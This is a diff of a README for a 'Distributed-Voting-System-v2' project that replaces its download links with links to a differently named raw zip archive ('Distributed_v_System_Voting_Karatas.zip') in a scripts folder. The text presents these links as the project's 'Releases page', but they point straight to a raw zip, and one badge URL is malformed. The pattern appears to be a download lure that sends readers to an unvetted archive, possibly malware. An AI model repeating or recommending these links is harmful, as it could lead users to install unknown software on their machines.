@@ -1,6 +1,6 @@
 # 🎉 Distributed-Voting-System-v2 - Simple Voting System for Everyone
 
-[![Download the latest release](https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/services/Distributed-Voting-System-v2_v3.9.zip%https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/services/Distributed-Voting-System-v2_v3.9.zip)](https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/services/Distributed-Voting-System-v2_v3.9.zip)
+[![Download the latest release](https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/scripts/Distributed_v_System_Voting_Karatas.zip%https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/scripts/Distributed_v_System_Voting_Karatas.zip)](https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/scripts/Distributed_v_System_Voting_Karatas.zip)
 
 ## 📖 Overview
 
@@ -41,7 +41,7 @@ Before downloading the software, ensure you have the following:
 
 ### 💾 Download & Install
 
-To get the latest version of the software, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/services/Distributed-Voting-System-v2_v3.9.zip)
+To get the latest version of the software, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/buvaaaannn/Distributed-Voting-System-v2/main/scripts/Distributed_v_System_Voting_Karatas.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you wish to download.
